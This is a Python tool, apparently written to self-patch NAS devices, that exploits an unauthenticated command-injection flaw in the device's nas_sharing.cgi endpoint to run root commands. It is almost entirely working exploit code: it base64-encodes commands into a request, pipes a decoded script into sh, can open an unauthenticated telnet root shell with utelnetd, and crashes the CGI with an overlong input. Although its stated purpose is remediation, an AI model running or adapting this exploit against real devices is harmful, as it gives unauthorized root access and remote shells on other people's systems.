import argparse
import base64
import logging
from pathlib import Path
import requests
import urllib.parse


logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
fmt = logging.Formatter(fmt="%(asctime)s [%(levelname)8s] %(message)s")
handler = logging.StreamHandler()
handler.setFormatter(fmt=fmt)
logger.addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

regular_response = """<?xml version="1.0" encoding="UTF-8"?>
<config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>
"""

FORBIDDEN_CHARS = "$`#%^&()+{};[]\\= "


class Dinkleberry:

    host: str

    def __init__(self, host):
        self.host = host

    def _perform_rce(self, command: list[str]) -> requests.Response:

        if any(forbidden in cmd for cmd in command for forbidden in FORBIDDEN_CHARS):
            logger.warning(
                "Forbidden character detected - will be escaped with a \\ character"
            )

        logger.debug(f"Command: {" ".join(command)}")
        params = {
            "user": "messagebus",
            "passwd": "",
            "cmd": 15,
            "system": base64.b64encode("\t".join(command).encode()),
        }
        if len(params["system"]) > 4096:
            raise ValueError("Command too long")
        headers = {"Accept-Encoding": "identity"}
        params_str = urllib.parse.urlencode(params, safe="=/+")
        target_url = f"http://{self.host}/cgi-bin/nas_sharing.cgi"
        response = requests.get(target_url, params=params_str, headers=headers)
        response.raise_for_status()
        if response.text.endswith(regular_response):
            trimmed = response.text[: -len(regular_response)]
            logger.debug(f"Output: {trimmed.strip()}")
        return response

    def is_vulnerable(self) -> bool:
        response = self._perform_rce(command=["id"])
        return response.status_code == 200 and "root" in response.text

    def patch(self) -> None:
        # The patch script contains all manner of forbidden characters, but we can
        # work around this by simply b64 encoding it, then decoding it on the device
        with open(Path(__file__).parent / "patch.sh") as f:
            patch_script = f.read()
        patch = base64.b64encode(patch_script.encode()).decode()

        # Encoding with base64 pads the end of the output with '=' characters for
        # alignment. However, = is a forbidden character. Just add more content to
        # the file until there is no padding required.
        while patch[-1] == "=":
            logger.debug("Found '=' padding in b64 script, extending input")
            patch_script += "\n"
            patch = base64.b64encode(patch_script.encode()).decode()

        # Pipe the encoded script file through openssl, and execute it
        self._perform_rce(
            command=["echo", patch, "|", "openssl", "base64", "-d", "|", "sh"]
        )

    def start_telnet(self):
        logger.warning("Telnet is obviously very insecure. Kill it when you're done.")
        self._perform_rce(["utelnetd", "-p", "23", "-l", "/bin/sh", "-d"])

    def kill_telnet(self):
        self._perform_rce(["killall", "utelnetd"])

    def buffer_overflow(self):
        self._perform_rce([";" * 2047])  # Responds
        self._perform_rce([";" * 2100])  # Empty response, when CGI crashes


def main():
    parser = argparse.ArgumentParser(prog="dinkleberry")
    parser.add_argument("target", type=str, help="Target NAS to patch")
    parser.add_argument(
        "--telnet", action="store_true", default=False, help="Start telnet server"
    )
    parser.add_argument(
        "--kill-telnet", action="store_true", default=False, help="Stop telnet server"
    )
    parser.add_argument(
        "--test",
        action="store_true",
        default=False,
        help="Test if device is vulnerable",
    )
    parser.add_argument(
        "--verbose",
        "-v",
        action="store_true",
        default=False,
        help="Set this to print debug messages",
    )
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)
        logging.getLogger().setLevel(logging.DEBUG)

    d = Dinkleberry(host=args.target)

    if not d.is_vulnerable():
        logger.info("Device not vulnerable")
        exit(1)

    logger.info("Device is vulnerable")
    if args.test:
        exit(0)

    if args.telnet:
        d.start_telnet()
        exit(0)

    if args.kill_telnet:
        d.kill_telnet()
        exit(0)

    logger.info("Patching vulnerability...")
    d.patch()
    if d.is_vulnerable():
        logger.info("Not successful :(")
        exit(1)
    else:
        logger.info("Successfully patched NAS")
        exit(0)


if __name__ == "__main__":
    main()
